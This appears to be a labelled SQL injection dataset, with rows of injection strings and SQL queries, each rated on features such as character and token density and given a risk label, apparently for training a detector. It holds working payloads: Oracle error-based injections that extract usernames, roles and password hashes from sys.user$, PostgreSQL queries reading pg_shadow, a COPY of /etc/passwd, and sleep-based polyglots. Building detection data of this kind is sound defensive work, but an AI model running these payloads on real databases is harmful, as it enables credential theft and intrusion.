sqli	d_char	d_token	punck	s_token	space	length	alw_true	output
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=7)) and 'i'='i	M	M	M	H	M	H	H	H-M
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=7)) and 'i'='i	H	M	M	L	M	L	H	H-M
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=8)) and 'i'='i	M	M	M	H	M	H	H	H-M
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=8)) and 'i'='i	M	M	M	H	M	H	H	H-M
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=8)) and 'i'='i	M	M	M	H	M	H	H	H-M
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=8)) and 'i'='i	M	M	M	H	M	H	H	H-M
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=8)) and 'i'='i	H	M	M	L	M	L	H	H-M
select version();	L	L	L	L	L	L	L	L
select current_database();	L	L	L	L	L	L	L	L
select current_user;	L	L	L	L	L	L	L	L
select session_user;	L	L	L	L	L	L	L	L
select current_setting('log_connections');	L	L	L	L	L	L	L	L
select current_setting('log_statement');	L	L	L	L	L	L	L	L
select current_setting('port');	L	L	L	L	L	L	L	L
select current_setting('password_encryption');	L	L	L	L	L	L	L	L
select current_setting('krb_server_keyfile');	L	L	L	L	L	L	L	L
select current_setting('virtual_host');	L	L	L	L	L	L	L	L
select current_setting('port');	L	L	L	L	L	L	L	L
select current_setting('config_file');	L	L	L	L	L	L	L	L
select current_setting('hba_file');	L	L	L	L	L	L	L	L
select current_setting('data_directory');	L	L	L	L	L	L	L	L
select * from pg_shadow;	L	L	L	L	L	L	L	L
select * from pg_group;	L	L	L	L	L	L	L	L
create table myfile (input text);	L	L	L	L	L	L	L	L
copy myfile from '/etc/passwd'; 	L	L	L	M	L	L	L	L
select * from myfile;copy myfile to /tmp/test;	L	L	L	M	L	L	L	L
sleep(1) /*‘ or sleep(1) or ‘“ or sleep(1) or “*/	L	M	L	L	M	M	L	L-M
sleep(1) /*' or sleep(1) or '" or sleep(1) or "*/	M	M	L	L	M	M	L	M
